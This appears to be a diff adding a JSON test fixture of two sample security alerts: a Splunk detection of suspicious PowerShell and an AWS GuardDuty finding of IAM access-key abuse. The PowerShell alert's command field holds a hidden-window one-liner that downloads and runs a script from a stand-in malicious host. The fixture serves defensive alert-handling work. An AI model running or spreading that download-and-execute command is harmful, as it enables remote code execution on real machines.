@@ -1,0 +1,28 @@
+[
+  {
+    "source": "splunk",
+    "event_id": "spk-001",
+    "title": "Suspicious PowerShell Execution Detected",
+    "severity": "high",
+    "timestamp": "2026-07-11T15:10:00Z",
+    "payload": {
+      "host": "WS-PROD-SQL-01",
+      "user": "db_service_admin",
+      "process_cmd": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')\"",
+      "source_ip": "192.168.12.14"
+    }
+  },
+  {
+    "source": "aws_guardduty",
+    "event_id": "gd-9821",
+    "title": "Unauthorized Access: IAM User Access Key Abuse",
+    "severity": "critical",
+    "timestamp": "2026-07-11T15:12:00Z",
+    "payload": {
+      "user_arn": "arn:aws:iam::123456789012:user/compromised_admin",
+      "action": "AssumeRole",
+      "source_ip": "203.0.113.50",
+      "location": "Anonymous Proxy IP Detected"
+    }
+  }
+]
